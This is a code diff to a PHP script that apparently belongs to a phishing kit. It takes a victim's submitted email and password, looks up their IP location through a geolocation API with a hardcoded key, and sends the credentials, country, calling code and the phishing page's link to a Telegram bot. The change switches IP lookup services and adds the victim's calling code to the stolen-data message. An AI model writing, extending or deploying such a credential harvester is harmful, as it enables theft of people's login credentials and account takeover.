@@ -38,10 +38,22 @@ $login = $_GET["login"];
 $linky = $_SERVER['HTTP_HOST'];
 
 if($email){
-$api_key = "26dc150b1cf3c41dc866400812300e6d";
-$cty = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
+$api_key = "3230fcc0de8ef60aba3a5b3bb81a6432";
+
+$cty = file_get_contents("http://api.ipapi.com/".$ip."?access_key=".$api_key."&format=1");
+
 $jsondata = json_decode($cty);
+
 $cty = $jsondata->country_name;
+
+$cod = file_get_contents("http://api.ipapi.com/".$ip."?access_key=".$api_key."&format=1");
+
+$jsondata = json_decode($cod);
+
+$cod = $jsondata->calling_code;
+
+
+
 
 
 
@@ -57,6 +69,7 @@ bot("sendMessage",[
 👤 ¦ 𝑬𝒎𝒂𝒊𝒍 » `$email`
 📟 ¦ 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅  » `$password`
 👁️‍🗨️¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 » $cty
+👁️‍🗨️¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 code » $cod
 ⏱ ¦ 𝑻𝒊𝒎𝒆 » $time
 📝 ¦ 𝑫𝒂𝒕𝒆 » $day/$month/$year
 🌐¦ 𝒀𝒐𝒖𝒓 𝑳𝒊𝒏𝒌 » https://$linky/index.php
